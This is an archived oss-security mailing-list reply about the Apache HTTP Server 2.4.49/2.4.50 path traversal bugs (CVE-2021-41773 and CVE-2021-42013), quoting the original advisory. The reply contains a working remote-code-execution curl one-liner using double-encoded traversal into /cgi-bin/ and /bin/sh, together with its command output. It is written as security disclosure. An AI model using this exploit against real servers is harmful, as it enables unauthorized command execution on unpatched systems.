X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1520" "Friday" "8" "October" "2021" "03:18:14" "+0200" "Roman Medina-Heigl Hernandez" "roman@rs-labs.com" nil "48" "Re: [oss-security] CVE-2021-42013: Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773)" nil nil nil "10" nil nil (number mark "U       roman@rs-lab Oct  8   48/1520  " thread-indent "\"Re: [oss-security] CVE-2021-42013: Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773)\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2021-42013: Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3872 invoked by uid 550); 8 Oct 2021 06:51:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30709 invoked from network); 8 Oct 2021 01:18:27 -0000
X-Virus-Scanned: Powered by H&S
To: oss-security@lists.openwall.com
References: <a2cd6ccf-b381-5513-3c7c-598a6da8c9c9@apache.org>
From: Roman Medina-Heigl Hernandez <roman@rs-labs.com>
Message-ID: <0d7be57c-87ae-c4aa-7207-2337c1a51c6d@rs-labs.com>
Date: Fri, 8 Oct 2021 03:18:14 +0200
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101
 Thunderbird/78.14.0
MIME-Version: 1.0
In-Reply-To: <a2cd6ccf-b381-5513-3c7c-598a6da8c9c9@apache.org>
Content-Type: multipart/alternative;
 boundary="------------4635F47542C35CBD420E53AF"
Content-Language: es-ES
Subject: Re: [oss-security] CVE-2021-42013: Path Traversal and Remote Code
 Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of
 CVE-2021-41773)

--------------4635F47542C35CBD420E53AF
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

Hi,

I posted RCE exploit for this (it works for both CVEs: 41773 & 42013)
and some other details regarding requirements / exploitability, which
you may find useful at:

https://twitter.com/roman_soft/status/1446252280597078024


Excerpt (for the sake of ml-archive):

RCE exploit both for Apache 2.4.49 (CVE-2021-41773) and 2.4.50
(CVE-2021-42013): root@CT406:~# curl
'http://192.168.0.191/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
--data 'echo Content-Type: text/plain; echo; id' uid=1(daemon)
gid=1(daemon) groups=1(daemon)


Cheers.

-r


El 07/10/2021 a las 17:24, Stefan Eissing escribió:
> Severity: critical
>
> Description:
>
> It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.  
>
> If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.
>
> This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.
>
> Credit:
>
> Reported by Juan Escobar from Dreamlab Technologies, Fernando Muñoz from NULL Life CTF Team, and Shungo Kumasaka
>
-- 
Saludos,
-Román


--------------4635F47542C35CBD420E53AF--
